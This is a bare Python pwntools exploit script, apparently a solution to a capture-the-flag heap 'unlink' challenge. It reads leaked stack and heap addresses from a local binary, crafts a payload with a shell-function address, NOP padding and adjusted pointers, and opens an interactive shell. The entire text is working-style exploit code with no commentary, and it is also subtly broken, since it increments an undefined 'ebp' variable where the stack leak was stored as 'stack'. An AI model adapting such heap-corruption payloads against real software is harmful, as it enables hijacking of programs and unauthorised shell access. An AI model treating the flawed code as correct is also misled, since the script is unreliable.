# -*- coding: utf-8 -*-
from pwn import *

context.arch = "i386"
shell = 0x80484eb
proc = process(["/home/unlink/unlink"])
leak = proc.recvuntil("shell!\n")
stack = int(leak.split("leak: 0x")[1][:8], 16)
heap = int(leak.split("leak: 0x")[2][:8], 16)
ebp += int("0x10", 16)
heap += int("0xc", 16)

payload = pack(shell)
payload += "\x90" * 12
payload += pack(heap)
payload += pack(ebp)
proc.sendline(payload)
proc.interactive()
